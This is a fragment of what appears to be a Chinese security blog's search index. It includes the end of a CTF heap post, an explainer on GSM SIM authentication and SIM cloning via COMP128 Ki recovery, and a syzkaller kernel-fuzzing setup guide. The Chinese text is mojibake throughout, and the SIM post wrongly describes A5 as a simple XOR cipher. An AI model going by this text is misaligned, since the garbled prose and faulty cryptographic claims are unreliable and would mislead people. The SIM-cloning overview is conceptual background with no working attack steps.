\n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIMå¡å¤åˆ¶åŸç†","url":"/2020/02/08/SIM/","content":"# SIMå¡å¤åˆ¶åŸç†\n\n> GSMæ‰‹æœºè¦æƒ³å¾—åˆ°GSMç³»ç»Ÿçš„æœåŠ¡éœ€è¦æ’å…¥ä¸€å¼ SIMå¡ã€‚å› ä¸ºGSMç³»ç»Ÿæ˜¯é€šè¿‡SIMå¡æ¥è¯†åˆ«ç”¨æˆ·çš„ï¼Œè€Œä¸æ˜¯åŸºäºæ‰‹æœºæ¥è¯†åˆ«ã€‚\n>\n> ç§»åŠ¨ç»ˆç«¯ä¸Šå¿…é¡»è£…ä¸Šsimå¡æ‰èƒ½ä½¿ç”¨ï¼Œsimå¡æ˜¯æ•´ä¸ª**GSMç³»ç»Ÿ**ï¼ˆå…¨çƒç§»åŠ¨é€šè®¯ç³»ç»Ÿï¼‰ä¸­å”¯ä¸€ç¡®è®¤ç”¨æˆ·èº«ä»½çš„è®¾å¤‡ã€‚\n\n## å¸¸ç”¨ç¼©å†™\n\nSIMï¼ŒSubscriber Identification Moduleï¼Œå®¢æˆ·è¯†åˆ«æ¨¡å—ï¼ˆä¹Ÿç§°ç”¨æˆ·èº«ä»½è¯†åˆ«å¡ï¼‰ã€‚\n\nIMEIï¼Œå›½é™…ç§»åŠ¨è®¾å¤‡è¯†åˆ«ç ã€‚ç”±15ä½æ•°å­—ç»„æˆï¼Œæ¯å°æ‰‹æœºå¯¹åº”ä¸€ä¸ªIMEIï¼Œä¸ºå…¨ä¸–ç•Œç‹¬ä¸€æ— äºŒçš„ã€‚\n\nMEIDï¼Œç§»åŠ¨è®¾å¤‡è¯†åˆ«ç ã€‚ç”±14ä½åå…­è¿›åˆ¶å­—ç¬¦ç»„æˆã€‚\n\nIMSIï¼Œå›½é™…ç§»åŠ¨ç”¨æˆ·è¯†åˆ«ç ã€‚é€šè¿‡IMSIå¯åæŸ¥è¿è¥å•†ã€å½’å±åœ°ã€æ‰‹æœºå·ç ç­‰ä¿¡æ¯ã€‚\n\n## simå¡çš„æ¼”è¿›\n\n1991å¹´ï¼Œå¾·å›½æ·å¾·å…¬å¸å¼€å‘äº†ä¸–ç•Œç¬¬ä¸€å¼ SIMå¡ï¼Œå¤§å°æ˜¯ä¸€ä¸ªåç‰‡çš„å¤§å°ã€‚æ­¤ç±»å¡æ˜¯**æ ‡å‡†SIMå¡**ï¼Œä¹Ÿå«â€œåŸå¡â€ã€‚\n\nä¸­å›½ç§»åŠ¨é€šä¿¡èµ·æ­¥è¾ƒæ™šï¼Œæ²¡èµ¶ä¸Šâ€œåŸå¡â€æ—¶ä»£ï¼Œå› æ­¤æˆ‘ä»¬ä¸€å¼€å§‹æ¥è§¦åˆ°çš„æ˜¯Mini SIMå¡ã€‚å†ä¹‹åç”±äºæ‰‹æœºé€æ­¥å°å‹åŒ–ï¼Œ2010å¹´å‡ºç°äº†Micro SIMå¡ï¼Œé¦–å…ˆä½¿ç”¨åœ¨è‹¹æœå…¬å¸çš„äº§å“ä¸Šï¼Œå¦‚ipadã€iphone4ã€‚2011å¹´ï¼Œè‹¹æœå…¬å¸æå‡ºäº†æ›´å°çš„simå¡æ ‡å‡†â€”â€”Nano SIMå¡ã€‚\n\n![](sim-4-kinds.png)\n\nä»¥ä¸Šçš„æ¼”è¿›ï¼Œè¯´ç™½äº†å°±æ˜¯å‰ªå¡è¿‡ç¨‹ï¼Œå¹¶ä¸æ˜¯ä»€ä¹ˆæŠ€æœ¯æ¼”è¿›ã€‚\n\nä½†æ˜¯Nano SIMå¡è¿˜æ˜¯å æ®è¾ƒå¤§çš„ç©ºé—´ï¼Œåœ¨å°å‹å¯ç©¿æˆ´è®¾å¤‡ä¸Šä¸å®ç”¨ï¼Œè€Œä¸”å¡æ§½ä¸­æ”¾å¡çš„æ–¹å¼ä¸ç¨³å®šã€‚å› æ­¤å‘å±•å‡ºäº†eSIMå¡Embeded-SIMï¼Œç›´æ¥åµŒå…¥åˆ°ç”µè·¯æ¿ä¸Šã€‚\n\nä½†æ˜¯eSIMä»ç„¶æ˜¯ä¸€ä¸ªç¡¬ä»¶ã€‚ç°åœ¨è¿˜å‡ºç°äº†ä¾é æ“ä½œç³»ç»Ÿè½¯ä»¶å®ç°SIMå¡åŠŸèƒ½çš„softSIMå’ŒvSIMï¼Œè¿™æ ·å°±å®Œå…¨å‘Šåˆ«å®ä½“SIMå¡ç‰‡äº†ã€‚\n\nä¼´éšç€ç½‘ç»œå˜åŒ–ï¼Œsimå¡çš„å˜åŒ–ï¼š\n\n- SIMå¡å­˜åœ¨æ— æ³•æ¥å…¥LTE/IMSç½‘ç»œçš„å±€é™æ€§\n- USIMå¯æ¥å…¥LTE/2G/3Gç½‘ç»œï¼Œä½†ä¸å­˜å‚¨IMSç½‘ç»œç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤æ¥å…¥VoLTEç½‘ç»œæ—¶ï¼Œè¿˜éœ€è¦é€šè¿‡ç»ˆç«¯å¯¼å‡ºIMSæ³¨å†Œæ—¶æ‰€éœ€è¦çš„ç”¨æˆ·ç å·ä¿¡æ¯ã€‚\n- ISIMå¡æ˜¯åœ¨USIMå¡çš„åŸºç¡€ä¸Šï¼Œå¢åŠ äº†ISIMæ¨¡å—ï¼Œä¸“é—¨ç”¨äºå­˜å‚¨IMSç½‘ç»œç›¸å…³ç”¨æˆ·ç å·å’Œå½’å±åœ°ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡è¯»å–ISIMæ¨¡å—ä¸­çš„ä¿¡æ¯ç›´æ¥æ¥å…¥VoLTEç½‘ç»œã€‚\n\n## simå¡ç¡¬ä»¶ç‰¹æ€§\n\n> simå¡æ˜¯ä¸€ä¸ªè£…æœ‰å¾®å¤„ç†å™¨çš„èŠ¯ç‰‡å¡ã€‚\n\nä¸‹é¢çœ‹ä¸€çœ‹å®é™…çš„simå¡é•¿ä»€ä¹ˆæ ·ï¼š\n\n![](sim-6-parts.png)\n\nsimå¡é€šè¿‡è¿™äº›é“œåˆ¶æ¥å£å°†å¡å†…é€»è¾‘ç”µè·¯ä¸ç§»åŠ¨ç»ˆç«¯è¿æ¥èµ·æ¥ã€‚å…¶ä¸­ä¸ç§»åŠ¨ç»ˆç«¯è¿æ¥çš„æœ‰å¦‚ä¸‹å…­ä¸ªè§¦ç”µï¼šç”µæºï¼ˆVccï¼‰ï¼Œå¤ä½ï¼ˆRESETï¼‰ï¼Œæ—¶é’Ÿï¼ˆCLKï¼‰ï¼Œæ¥åœ°ç«¯ï¼ˆGNDï¼‰ï¼Œç¼–ç¨‹ç”µå‹ï¼ˆVPPï¼‰ï¼Œæ•°æ®I/Oæ¥å£ï¼ˆDataï¼‰\n\nsimå¡ç¡¬ä»¶å†…éƒ¨åŒ…å«å¦‚ä¸‹äº”ä¸ªæ¨¡å—ï¼š\n\n- å¾®å¤„ç†å™¨cpuï¼Œ8ä½\n- ç¨‹åºå­˜å‚¨å™¨ROMï¼Œ3~8kbit\n- å·¥ä½œå­˜å‚¨å™¨RAMï¼Œ6~16kbit\n- æ•°æ®å­˜å‚¨å™¨EPROMï¼Œ128~256kbit\n- ä¸²è¡Œé€šä¿¡å•å…ƒ\n\nä½¿ç”¨æ—¶ï¼Œæ‰‹æœºä¼šå‘simå¡å‘é€å‘½ä»¤ï¼Œsimå¡æ ¹æ®æ ‡å‡†è§„èŒƒæ‰§è¡Œåï¼Œç»™æ‰‹æœºåé¦ˆæ‰§è¡Œç»“æœã€‚\n\n##ã€€simå¡çš„åŠŸèƒ½\n\n1ã€å­˜å‚¨æ•°æ®ï¼š\n\n- å›ºå®šæ•°æ®ï¼šè¿™ç±»æ•°æ®åœ¨MEï¼ˆMobile Equipmentï¼‰è¢«å‡ºå”®ä¹‹å‰ç”±SIMå¡ä¸­å¿ƒå†™å…¥ï¼ŒåŒ…æ‹¬å›½é™…ç§»åŠ¨ç”¨æˆ·è¯†åˆ«å·ï¼ˆIMSIï¼‰ã€é‰´æƒå¯†é’¥ï¼ˆKIï¼‰ç­‰\n- ä¸´æ—¶æ•°æ®ï¼šæŒ‡çš„æ˜¯ç½‘ç»œç›¸å…³çš„çš„ä¸´æ—¶æ•°æ®ï¼Œå¦‚ä½ç½®åŒºåŸŸè¯†åˆ«ç ï¼ˆLAIï¼‰ã€ç§»åŠ¨ç”¨æˆ·æš‚æ—¶è¯†åˆ«ç ï¼ˆTMSIï¼‰ã€ç¦æ­¢æ¥å…¥çš„å…¬å…±ç”µè¯ç½‘ä»£ç ç­‰\n- ä¸šåŠ¡ä»£ç ï¼šå¦‚ä¸ªäººè¯†åˆ«ç ï¼ˆPINï¼‰ã€è§£é”ç ï¼ˆPUKï¼‰ã€è®¡è´¹è´¹ç‡ç­‰\n- ç”µè¯å·ç ã€çŸ­æ¶ˆæ¯ç­‰ç”¨æˆ·è®°å½•\n\nï¼ˆä»¥ä¸Šå››ç±»æ•°æ®ï¼Œé™¤ç¬¬ä¸€ç±»åªæœ‰ä¸“ä¸šéƒ¨é—¨èƒ½æŸ¥é˜…å’Œæ›´æ–°å¤–ï¼Œå…¶ä»–å‡ ç±»éƒ½æ˜¯æ‰‹æœºå¯æŸ¥é˜…å’Œæ›´æ–°çš„ï¼‰\n\n2ã€PINç ä¿æŠ¤\n\n3ã€ç”¨æˆ·èº«ä»½é‰´æƒ\n\n4ã€SIMå¡ä¸­çš„ä¿å¯†ç®—æ³•åŠå¯†é’¥\n\n## simå¡è®¤è¯\n\nSIMå¡ä¸­æ²¡æœ‰å­˜å‚¨æœ¬æœºå·ç ï¼Œä»…æœ‰IMISå·ã€‚å½“æˆ‘ä»¬åœ¨è¥ä¸šå…ç”³è¯·å¹¶æ³¨å†Œæ‰‹æœºå·æ—¶ï¼Œè¿è¥å•†å°†æ‰‹æœºå·ç ä¸SIMå¡çš„IMSIå·ã€åºåˆ—å·ä»¥åŠé‰´æƒå¯†é’¥Kiåšç™»è®°ï¼Œå‚¨å­˜åœ¨æ•°æ®åº“é‡Œã€‚\n\nSIMå¡æ’å…¥åˆ°æ‰‹æœºä¸­å¼€æœºæ—¶ï¼Œæ‰‹æœºå‘SIMå¡è¯·æ±‚IMSIï¼Œç„¶åæŠŠIMSIå‘é€ç»™è¿è¥å•†ã€‚è¿è¥å•†åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¿™ä¸ªIMSIå¹¶åˆ¤æ–­æ˜¯å¦ä¸ºåˆæ³•ç”¨æˆ·ï¼Œç„¶åè·å¾—è¿™ä¸ªIMSIå¯¹åº”çš„æ‰‹æœºå·ç å’Œé‰´æƒå¯†é’¥Kiã€‚\n\nè¿è¥å•†å†ç”Ÿæˆä¸€ä¸ªéšæœºæ•°RANDï¼Œç„¶åå°†è¯¥éšæœºæ•°å‘é€ç»™æ‰‹æœºã€‚æ‰‹æœºæ¥æ”¶åˆ°éšæœºæ•°RANDåï¼Œå°†è¯¥éšæœºæ•°RANDå‘é€ç»™SIMå¡ã€‚SIMå¡åˆ©ç”¨RANDå’Œé‰´æƒå¯†é’¥Kié€šè¿‡A3ç®—æ³•ç”Ÿæˆåº”ç­”SRESï¼Œå°†SRESå‘é€ç»™æ‰‹æœºï¼Œå†ç”±æ‰‹æœºè½¬å‘ç»™è¿è¥å•†ã€‚è¿è¥å•†åœ¨æœ¬åœ°åˆ©ç”¨RANDå’Œå¯¹åº”çš„é‰´æƒå¯†é’¥Kiè¿›è¡Œç›¸åŒçš„è¿ç®—ï¼Œå¾—åˆ°X-SRESï¼Œå¹¶æ¯”è¾ƒSRESå’ŒX-SRESæ˜¯å¦ç›¸åŒï¼Œç›¸åŒçš„è¯å°±è¯´æ˜è¿™ä¸ªå¡æ˜¯åˆæ³•çš„ï¼Œå…è®¸å…¶æ¥å…¥ç½‘ç»œã€‚\n\nä¸Šä¸€æ­¥éª¤ä¸­ï¼Œæ‰‹æœºç«¯æ”¶åˆ°RANDæ—¶ï¼ŒåŒæ—¶è¿˜ä¼šè®©SIMå¡åˆ©ç”¨RANDå’ŒKiè®¡ç®—å‡ºä¸€ä¸ªé€šä¿¡ç”¨çš„åŠ å¯†å¯†é’¥Kcï¼Œè®¡ç®—æ—¶ç”¨çš„ç®—æ³•ç§°ä¹‹ä¸ºA8ã€‚ç”±äºA3å’ŒA8æ¥å—çš„è¾“å…¥ç›¸åŒï¼Œå› æ­¤å®ç°è€…å·äº†ä¸ªæ‡’ï¼Œç”¨ä¸€ä¸ªç®—æ³•åŒæ—¶ç”ŸæˆSRESå’ŒKcã€‚\n\nä¹‹åçš„é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨åŠ å¯†å¯†é’¥Kcå’ŒA5ç®—æ³•å¯¹é€šä¿¡å†…å®¹è¿›è¡ŒåŠ å¯†ã€‚ç”±äºé€šä¿¡å†…å®¹çš„åŠ å¯†é‡å·¨å¤§ï¼ŒSIMå¡æ— æ³•å¿«é€Ÿå¤„ç†å¦‚æ­¤å¤šçš„åŠ å¯†éœ€æ±‚ï¼Œå› æ­¤é€šä¿¡è¿‡ç¨‹ä¸­çš„åŠ å¯†éƒ½æ˜¯åœ¨æ‰‹æœºä¸Šå®Œæˆçš„ã€‚å› æ­¤ï¼Œæ‰€æœ‰çš„GSMæ‰‹æœºéƒ½å¿…é¡»è‡³å°‘æ”¯æŒä¸€ç§ç›¸åŒçš„A5ç®—æ³•ï¼Œå¦åˆ™å°±æ— æ³•æ¼«æ¸¸äº†ã€‚è¿™æ—¶å€™è¿è¥å•†å’Œè®¾å¤‡å•†åˆå·äº†ä¸ªæ‡’ï¼Œå…¨ä¸–ç•Œç›®å‰éƒ½åªç”¨ä¸€ç§A5ç®—æ³•ã€‚è¿™ä¸ªç®—æ³•çš„åšæ³•å°±æ˜¯å’ŒKcçš„8å­—èŠ‚åºåˆ—è¿›è¡Œç®€å•çš„å¾ªç¯XORï¼Œå†å’ŒæŠ¥æ–‡åºå·åšä¸ªå‡æ³•ã€‚\n\n## simå¡å¤åˆ¶\n\nä»ä»¥ä¸ŠSIMå¡è®¤è¯åŸç†ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“IMSIå’ŒKiæ˜¯å¿…ä¸å¯å°‘çš„ï¼ŒA3ç®—æ³•ä¹Ÿå¿…é¡»çŸ¥é“ã€‚IMSIå¯ä»¥é€šè¿‡æ‰‹æœºå°†å…¶ä»SIMå¡ä¸­è¯»å–å‡ºæ¥ï¼Œä½†æ˜¯A3ç®—æ³•å’Œé‰´æƒå¯†é’¥Kiæ˜¯æ— æ³•ç›´æ¥è·å–çš„ï¼Œåªèƒ½é€šè¿‡æŸç§æ–¹æ³•ç ´è§£ã€‚\n\nA3ç®—æ³•ä¸€ç›´è¢«ä½œä¸ºé«˜çº§å•†ä¸šæœºå¯†ä¿æŠ¤èµ·æ¥ã€‚ä½†åœ¨1998å¹´å·¦å³ï¼Œæœ‰ä¸ªäººæ³„éœ²äº†å‡ é¡µå…³äºA3ç®—æ³•çš„æ–‡æ¡£åˆ°ç½‘ç»œä¸Šã€‚åŠ å·ä¼¯å…‹åˆ©çš„å‡ ä¸ªæ•™æˆæ‹¿åˆ°è¿™ä¸ªæ–‡æ¡£åï¼Œå¯¹ç…§ç€SIMå¡ç ”ç©¶äº†ä¸€é˜µï¼Œæœ€ç»ˆå°†A3ç®—æ³•ç ´è§£äº†ã€‚è¿™ä¸ªç®—æ³•åˆå«åšComp128ã€‚\n\næ€ä¹ˆè·å–Kiå‘¢ï¼Ÿä¸¤ä¸ªæ€è·¯ï¼Œä¸€ç§æ˜¯æŠŠSIMå¡æ‹†æ‰ç„¶åæ¥åˆ°ç‰¹æ®Šè®¾å¤‡ä¸Šå°†Kiè¯»å–å‡ºæ¥ï¼Œå¦ä¸€ç§æ˜¯åˆ©ç”¨Comp128å»æš´åŠ›ç ´è§£ã€ç©·ä¸¾ã€‚å‰ä¸€ç§æ–¹æ³•å°±åƒç”¨å°åˆ€åœ¨ç¡¬ç›˜ä¸Šåˆ»æ“ä½œç³»ç»Ÿä¸€æ ·ä¸é è°±ã€‚åä¸€ç§æ–¹æ³•æœ‰ä¸€å®šçš„é™åˆ¶ï¼ŒSIMå¡ä¸­çš„é€»è¾‘æ˜¯ä¸€å…±åªèƒ½æŸ¥è¯¢2^16æ¬¡å·¦å³ï¼Œä¹‹åå¡å°±ä¸å¯ç”¨äº†ã€‚å› æ­¤ï¼Œç ”ç©¶è€…ä»¬åªèƒ½åœ¨å¯æ¥å—çš„æ¬¡æ•°ä¹‹å†…ï¼Œé€šè¿‡æ„é€ ç‰¹å®šæ˜æ–‡å’Œåˆ†æè¾“å‡ºçš„å¯†æ–‡æ¥ç ´è§£Kiçš„å€¼ã€‚è¿™ç§æ–¹æ³•æœ€ç»ˆæˆåŠŸäº†ã€‚\n\nç”±äºSIMå¤åˆ¶è®¾å¤‡è¶Šæ¥è¶Šå¤šï¼Œè¿è¥å•†ä»¬ä¸å¾—ä¸å‘è¡Œæ–°ç®—æ³•çš„å¡ï¼Œè¿™ä¸ªç®—æ³•å«åšComp128 v2ã€‚è¿™ä¸ªç®—æ³•ç›®å‰ä¸ºæ­¢è¿˜æ²¡è¢«ç ´è§£ã€‚\n\n\n# reference\nSIMå¡å®ç°åŸç†ï¼šhttps://www.jianshu.com/p/8c9374f5e581\n\n4G LTE ç½‘åªèƒ½æä¾›æ•°æ®æœåŠ¡ï¼Œä¸èƒ½æ‰¿è½½è¯­éŸ³é€šè¯ï¼Œè¯¥æ€ä¹ˆç†è§£ï¼Ÿhttps://www.zhihu.com/question/22365275\n\nSIMå¡å¤åˆ¶åŸç†ï¼šhttps://cn.club.vmall.com/thread-2454925-1-1.html\n\nå…³äºSIMå’ŒeSIMï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿå•¦ï¼https://zhuanlan.zhihu.com/p/47999705\n\nSIMå¡ä¸­çš„A3ã€A5å’ŒA8ç®—æ³•ï¼šhttp://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\nä»€ä¹ˆæ˜¯ä¼ªåŸºç«™ï¼Ÿhttps://www.zhihu.com/question/36723973","categories":["é€šä¿¡"]},{"title":"syzkaller fuzzå·¥å…·çš„ä½¿ç”¨æ–¹æ³•åŠå®è·µå®ä¾‹","url":"/2019/10/26/syzkaller/","content":"\n\n\n[Syzkaller](https://github.com/google/syzkaller) æ˜¯googleå®‰å…¨ç ”ç©¶äººå‘˜å¼€å‘å¹¶ç»´æŠ¤çš„å†…æ ¸fuzzå·¥å…·ï¼ˆ2015å¹´åœ¨githubå¼€æºï¼‰ï¼Œç”±goè¯­è¨€ç¼–å†™ï¼Œå«å°‘éƒ¨åˆ†c/c++ä»£ç ã€‚æ”¯æŒå¤šä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå¦‚linuxã€windowsã€darwinã€openbsdç­‰ç­‰ï¼Œå…¶å¯¹linuxçš„æ”¯æŒæœ€ä¸ºå…¨é¢ã€‚\n\næœ¬ç¯‡æ–‡ç« å°†æ­å»ºsyzkallerç¯å¢ƒçš„è¿‡ç¨‹è®°å½•ä¸‹æ¥ï¼Œä¾›ä¹‹åå‚è€ƒã€‚\n\næ›´æ–°äº†ä¸€ä¸ªè§†é¢‘ï¼š[å†…æ ¸fuzzå·¥å…·Syzkallerä½¿ç”¨æ–¹æ³•ä»‹ç»](https://www.bilibili.com/video/BV1gL4y1j7Cs?spm_id_from=333.999.0.0)\n\n# x86-64 linuxè™šæ‹Ÿæœº\n\n> fuzzå¯¹è±¡æ˜¯linux kernelï¼Œæ¶æ„æ˜¯x86-64ï¼Œä½¿ç”¨qemuæ¨¡æ‹Ÿè¿è¡Œã€‚\n\n## ç¼–è¯‘syzkaller\n\n> ä»¥syzkaller githubä¸Šæœ€æ–°ç‰ˆä¸ºå‡†ï¼Œé¡¹ç›®ä¸€ç›´åœ¨æ›´æ–°ï¼Œä»Šå¤©ï¼ˆ2022å¹´2æœˆï¼‰ç¼–è¯‘çš„æ—¶å€™ï¼Œè·Ÿæˆ‘ä¸Šæ¬¡ï¼ˆ2020å¹´12æœˆï¼‰ç¼–è¯‘æœ‰æŒºå¤šåœ°æ–¹éƒ½ä¸ä¸€æ ·äº†ã€‚\n\n[å®˜æ–¹æŒ‡å¯¼æ–‡æ¡£](https://github.com/google/syzkaller/blob/master/docs/linux/setup.md)\n\n1. ä¸‹è½½goè¯­è¨€ç¼–è¯‘å™¨\n\n   ```bash\n   wget https://dl.google.com/go/go1.17.6.linux-amd64.tar.gz\n   tar -xf go1.17.6.linux-amd64.tar.gz\n   # åé¢è¿™ä¸¤æ¡å‘½ä»¤å»ºè®®è®¾ç½®åˆ°ï½/.bashrcæ–‡ä»¶ä¸­ï¼Œé€šè¿‡source ~/.bashrcå‘½ä»¤æ›´æ–°é…ç½®\n   export GOROOT=`pwd`/goroot\n   export PATH=$GOROOT/bin:$PATH\n   ```\n\n2. ä¸‹è½½å¹¶ç¼–è¯‘syzkaller\n\n   ```bash\n   git clone https://github.com/google/syzkaller\n   cd syzkaller\n   make\n   # å¦‚æœfuzzç›®æ ‡æ˜¯arm 64ä½ï¼Œåˆ™éœ€æŒ‡å®šäº¤å‰ç¼–è¯‘å™¨ï¼Œå¦‚ä¸‹\n   # make CC=aarch64-linux-gnu-g++ TARGETARCH=arm64\n   ```\n\n   ç¼–è¯‘è¿‡ç¨‹ä¸­é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œæ˜¯å› ä¸ºè™šæ‹Ÿæœºå†…å­˜ç»™å°‘äº†ï¼Œç»™åˆ°12Gå†…å­˜åä¸å†æŠ¥é”™ã€‚\n\nç¼–è¯‘å®Œæˆåï¼Œåœ¨syzkallerç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ªbinç›®å½•ï¼Œé‡Œé¢å°±æ˜¯æˆ‘ä»¬åé¢éœ€è¦ç”¨åˆ°çš„äºŒè¿›åˆ¶ã€‚å¦‚ä¸‹æ˜¯æˆ‘ç¼–è¯‘çš„ç»“æœï¼š\n\n```bash\n~/syzkaller$ tree ./bin\n./bin\nâ”œâ”€â”€ linux_amd64\nâ”‚Â Â  â”œâ”€â”€ syz-execprog\nâ”‚Â Â  â”œâ”€â”€ syz-executor\nâ”‚Â Â  â”œâ”€â”€ syz-fuzzer\nâ”‚Â Â  â””â”€â”€ syz-stress\nâ”œâ”€â”€ syz-db\nâ”œâ”€â”€ syz-manager\nâ”œâ”€â”€ syz-mutate\nâ”œâ”€â”€ syz-prog2c\nâ”œâ”€â”€ syz-repro\nâ”œâ”€â”€ syz-runtest\nâ”œâ”€â”€ syz-sysgen\nâ””â”€â”€ syz-upgrade\n```\n\n## ç¼–è¯‘linuxå†…æ ¸\n\n1. ä»¥linux 5.14å†…æ ¸ä¸ºä¾‹ï¼Œå…ˆå°†æºç ä¸‹è½½åˆ°æœ¬åœ°\n\n   ```bash\n   git clone --branch v5.14 git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n   ```\n\n2. ç”Ÿæˆé»˜è®¤é…ç½®æ–‡ä»¶\n\n   ```bash\n   cd linux\n   make defconfig\n   make kvm_guest.config\n   ```\n\n3. æ›´æ”¹.configæ–‡ä»¶\n\n   ä¸ºäº†fuzzæ•ˆç‡ï¼Œä»¥ä¸‹å†…æ ¸é…ç½®å¿…é¡»æ‰“å¼€ã€‚æ›´å¤šå¯é€‰é…ç½®è§[Linux kernel configs](https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md)\n\n   ```bash\n   # Coverage collection.\n   CONFIG_KCOV=y         # must\n   \n   # Debug info for symbolization.\n   CONFIG_DEBUG_INFO=y\n   \n   # Memory bug detector\n   CONFIG_KASAN=y\n   CONFIG_KASAN_INLINE=y\n   \n   # Code coverage works better when KASLR Is disabled \n   # CONFIG_RANDOMIZE_BASE is not set\n   \n   # å¯é€‰\n   CONFIG_KCOV_INSTRUMENT_ALL=y\n   CONFIG_KCOV_ENABLE_COMPARISONS=y\n   CONFIG_DEBUG_FS=y\n   \n   CONFIG_DEBUG_KMEMLEAK=y\n   ```\n\n4. é‡æ–°ç”Ÿæˆé…ç½®æ–‡ä»¶å¹¶ç¼–è¯‘\n\n   ```bash\n   make olddefconfig\n   make -j4\n   ```\n\n5. æ¼«é•¿çš„ç­‰å¾…åï¼Œå°±èƒ½åœ¨ç›®å½•ä¸‹çœ‹åˆ°`vmlinux` (kernel binary) å’Œ `bzImage` (packed kernel image)\n\n   ```bash\n   ~$ ls linux/vmlinux\n   linux/vmlinux\n   ~$ ls linux/arch/x86/boot/bzImage\n   linux/arch/x86/boot/bzImage\n   ```\n\n\n## é…ç½®qemuè™šæ‹Ÿæœº\n\n1. å®‰è£…qemu\n\nä½¿ç”¨`sudo apt install qemu`æˆ–ä¸‹è½½æœ€æ–°qemuæºç ç¼–è¯‘ã€‚å‰è€…çš„ç‰ˆæœ¬è¾ƒä½ï¼Œæœ‰äº›ç‰¹æ€§ä¸æ”¯æŒã€‚å»ºè®®ä½¿ç”¨åè€…ã€‚\n\n2. ç”Ÿæˆimage\n\nä½¿ç”¨debootstrapæ„å»ºlinuxå¯åŠ¨é•œåƒï¼š\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# å¯ä»¥ä½¿ç”¨./create-image.sh -hæŸ¥çœ‹æ›´å¤šå¸®åŠ©é€‰é¡¹\n```\n\nå®Œæˆä¹‹åç›®å½•å†…å®¹å¦‚ä¸‹ï¼š\n\n```shell\n~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1æœˆ   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1æœˆ   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1æœˆ   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1æœˆ   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1æœˆ   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1æœˆ   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1æœˆ   9 09:04 stretch.img\n```\n\n3. å¯åŠ¨è™šæ‹Ÿæœº\n\nå¯åŠ¨è™šæ‹Ÿæœºè¯•è¯•\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/linux/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/qemu-img/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee vm.log\n```\n\nå¯¹ä»¥ä¸Šå„å‚æ•°æˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š\n\n```\n-kernel xxx/bzImageï¼šç”¨bzImageä½œä¸ºå†…æ ¸é•œåƒï¼Œqemuçš„è¿™ä¸ªåŠŸèƒ½ç”¨æ¥æµ‹è¯•ä¸åŒå†…æ ¸éå¸¸æ–¹ä¾¿ã€‚\n-append cmdlineï¼šå°†cmdlineä½œä¸ºå†…æ ¸çš„å‘½ä»¤è¡Œå‚æ•°\n-hda xxx/xxx.imgï¼šæŒ‡å®šxxx.imgä½œä¸ºç¡¬ç›˜é•œåƒ\n-net user,hostfwd=tcp::10021-:22 -net nicï¼šå®¢æˆ·æœºä¸å®¿ä¸»æœºä¹‹é—´é€šè¿‡æŒ‡å®šçš„ç«¯å£è¿›è¡Œé€šè®¯\n-enable-kvmï¼šå¼€å¯kvmè™šæ‹ŸåŒ–\n-nographicï¼šéå›¾å½¢ç•Œé¢å¯åŠ¨\n-m 2Gï¼šåˆ†é…2Gå†…å­˜ç»™è™šæ‹Ÿç³»ç»Ÿ\n-smp 2ï¼šæŒ‡å®šè™šæ‹Ÿæœºç”±2ä¸ªCPU\n-pidfile xxx.pidï¼šå°†qemuè¿›ç¨‹pidå‚¨å­˜åœ¨xxx.pidè¿™ä¸ªæ–‡ä»¶ä¸­\n2>&1 | tee vm.logï¼šå°†æ‰§è¡Œè¿‡ç¨‹ä¸­çš„è¾“å‡ºåŒæ—¶å®šå‘åˆ°æ ‡å‡†è¾“å‡ºå’Œvm.logæ–‡ä»¶ä¸­\n```\n\nå‚è€ƒäº†ä¸¤ç¯‡æ–‡ç« ï¼šï¼ˆ1ï¼‰[hostfwdçš„é—®é¢˜](https://blog.csdn.net/tzwsoho/article/details/80303088) ï¼ˆ2ï¼‰[make 2>&1 | tee log.txt å‘½ä»¤è§£æ](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemuå¯åŠ¨èµ·æ¥ä¹‹åï¼Œè¿è¡Œsshæµ‹è¯•ä¸€ä¸‹æ˜¯å¦è¿é€šï¼Œä¾¿äºåæœŸsyzkallerè¿è¡Œå‡ºé”™æ—¶å®šä½é—®é¢˜ã€‚\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\næ›¾ç»æœ‰ä¸€æ¬¡è¿æ¥æ—¶åœ¨è¿™é‡Œå‡ºäº†é—®é¢˜ï¼Œå®¿ä¸»æœºä¸Šsshæ— æ³•è¿æ¥åˆ°è™šæ‹Ÿæœºã€‚åŸå› 